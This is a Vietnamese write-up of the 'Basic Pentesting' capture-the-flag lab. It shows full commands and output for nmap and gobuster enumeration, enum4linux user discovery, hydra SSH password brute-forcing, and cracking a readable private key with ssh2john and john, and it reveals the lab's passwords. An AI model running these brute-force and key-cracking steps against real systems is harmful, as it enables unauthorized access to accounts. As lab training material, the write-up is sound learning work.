# Basic Pentesting
## Deploy the machine and connect to our network:
> No answer needed

## Find the services exposed by the machine:
> No answer needed

## What is the name of the hidden directory on the web server: 

Dùng **nmap** để quét các cổng và dịch vụ đang chạy trên web server.

```
$ nmap -sC -sV -oN nmap/scan_result <IP>
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
22/tcp   open  ssh
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  �GM�U      Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http-proxy
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-10-15T17:33:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2023-10-15T13:33:47-04:00
|_clock-skew: mean: 1h20m02s, deviation: 2h18m34s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 278.21 seconds
```

Ta thấy được có 5 cổng đang mở và có 1 cổng khá đặc biệt đó là 8009, cái này có một cve liên quan đến dịch vụ ajp(note lại thôi=))).

Để xem các thư mục ẩn thì cách đơn giản nhất là vét cạn nó, **gobuster** thôi. (gobuster sẽ gửi các request đến trang web, sau đó dựa vào response của nó để xem có thư mục đó tồn tại hay không).

```c
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.10.106.148             
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.106.148
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/.htpasswd            (Status: 403) [Size: 297]
/development          (Status: 301) [Size: 320] [--> http://10.10.106.148/development/]
/index.html           (Status: 200) [Size: 158]
/server-status        (Status: 403) [Size: 301]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Với status 403 là status không thể truy cập, tuy nhiên có 2 cái **/development** và **/index.html** có thể vào đc.

![img/image2.png](img/image2.png)

Vậy thư mục ẩn ở đây là **/development**

## User brute-forcing to find the username & password: 
> No answer needed
## What is the username?
Answer format: ***

Với username ta có thể dùng 1 công cụ khá mạnh(vét hơi lâu) là enum4linux để brute-forcing username trong wordlists

```js
enum4linux -a 10.10.14.230
```

Với 1 chút kiên nhẫn ( khoảng 10p :) ) thì ta sẽ thu được các username sau:
![img/image3.png](img/image3.png)

Thử 1 trong 2 và được user là **jan**
## What is the password?
Answer format: *******

Tiếp tục dùng cả thanh xuân để brute-forcing, lần này là password, dùng một tool khác tên là **hydra**.

```c
└─$ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.14.230
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-16 10:59:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.14.230:22/
[STATUS] 142.00 tries/min, 142 tries in 00:01h, 14344259 to do in 1683:36h, 14 active
[STATUS] 98.67 tries/min, 296 tries in 00:03h, 14344105 to do in 2422:60h, 14 active
[STATUS] 96.43 tries/min, 675 tries in 00:07h, 14343726 to do in 2479:10h, 14 active
[22][ssh] host: 10.10.14.230   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-16 11:08:29
```
Ok, bây giờ ta đã có được mật khẩu của **jan** là **armando**

Có username, có mật khẩu, có luôn giao thức, giờ thì hehe truy cập thôi chứ chờ cm gì nữa <(")
## What service do you use to access the server(answer in abbreviation in all caps)?
> Answer format: ***

* Dịch vụ truy cập thì chắc chắn là **ssh** rồi.
## Enumerate the machine to find any vectors for privilege escalation
> No answer needed
## What is the name of the other user you found(all lower case)?
> Answer format: ***
* User còn lại mà ta tìm được là **kay** (lát nữa sẽ cần đến anh zai này)
## If you have found another user, what can you do with this information?
> No answer needed
## What is the final password you obtain?

Giờ tiến hành leo thang đặc quyền và tìm mật khẩu cuối cùng.

Như ở trên, có user, pass ta dùng ssh để truy cập từ xa đến máy chủ.

Khi vào xong, đầu tiên phải check xem trong này có những thứ gì?
Và kết quả là éo có gì trong cả:)
```c
jan@basic2:~$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 root jan    47 Apr 23  2018 .lesshst
```

Thử vào **/home** xem có gì không thì ta thu được như này:
```c
jan@basic2:~$ cd /home
jan@basic2:/home$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Apr 19  2018 .
drwxr-xr-x 24 root root 4096 Apr 23  2018 ..
drwxr-xr-x  2 root root 4096 Apr 23  2018 jan
drwxr-xr-x  5 kay  kay  4096 Apr 23  2018 kay
```

Hmm vào thử kay thì thấy file pass.bak nhưng không vào được, nên là phải tìm đường khác thôi.

Sau một hồi vật lộn tìm kiếm thì mình tìm được một thứ khá hay ho trong **.ssh** trong **/home/kay**
```c
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```
Ta có được khóa public và private, giờ chỉ cần crack nó và sẽ truy cập với quyền là **kay**. 
Với một khóa rsa thì nên dùng **john the ripper** để crack nó.

Đầu tiên phải chuyển về dạng mà john có thể đọc được. Rồi brute-forcing nó bằng John với 1 wordlist siêu mạnh là **rockyou.txt**
```
$ ssh2john id_rsa > crackme
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa
```

Và ta thu được mật khẩu là **beeswax**

Ban đầu mình đã nghĩ giờ có mật khẩu của thằng **kay** rồi thì chỉ cần ssh dùng pass này là ok, nhưng không:))

Nó đã vả vào mặt mình bằng chữ:
```c
└─$ ssh -i id_rsa kay@10.10.80.48
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
```
Theo như nó nói thì cái chìa khóa này không được bảo vệ, sau khi kiểm tra lại thì thấy quyền của **id_rsa** là
> -rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa

Theo đó thì quyền của chủ sở hữu(owner) tất nhiên là rw-, tuy nhiên thì ở phía sau quyền của nhóm người dùng(groups) r-- và người dùng khác(others) r--.
Tức là nó sẽ coi đây là khóa không an toàn nên chặn truy cập, vậy giờ chỉ cần đổi quyền là được
```c
chmod 600 id_rsa
```

Ok bây giờ thử lại và tất nhiên là không hề có cái cảnh báo nào ở đây nữa cả:)

Nhập pass là **beeswax** rồi đọc file **pass.bak** thôi
```c
└─$ ssh -i id_rsa kay@10.10.80.48
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```
